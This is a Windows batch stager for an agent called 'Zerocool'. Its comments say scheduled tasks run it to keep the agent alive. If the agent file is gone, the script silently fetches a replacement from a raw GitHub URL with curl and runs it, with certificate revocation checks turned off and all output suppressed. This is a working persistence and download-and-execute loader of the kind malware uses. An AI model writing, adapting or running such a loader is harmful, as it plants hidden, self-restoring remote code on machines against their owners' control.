@echo off
rem ZEROCOOL_RUN R1 - task stager: self-heal the agent file if wiped, then run it.
rem Both scheduled tasks point here; this file is what keeps Zerocool alive.
set "ZD=C:\ProgramData\Zerocool"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if exist "%ZD%\zerocool_agent.cmd" goto :Run
%SystemRoot%\System32\curl.exe -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%ZD%\zerocool_agent.dl" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/zerocool_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%ZD%\zerocool_agent.dl" exit /b 1
findstr /C:"ZEROCOOL_AGENT" "%ZD%\zerocool_agent.dl" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\zerocool_agent.dl" >nul 2>&1 & exit /b 2 )
move /y "%ZD%\zerocool_agent.dl" "%ZD%\zerocool_agent.cmd" >nul 2>&1
:Run
call "%ZD%\zerocool_agent.cmd"
exit /b 0
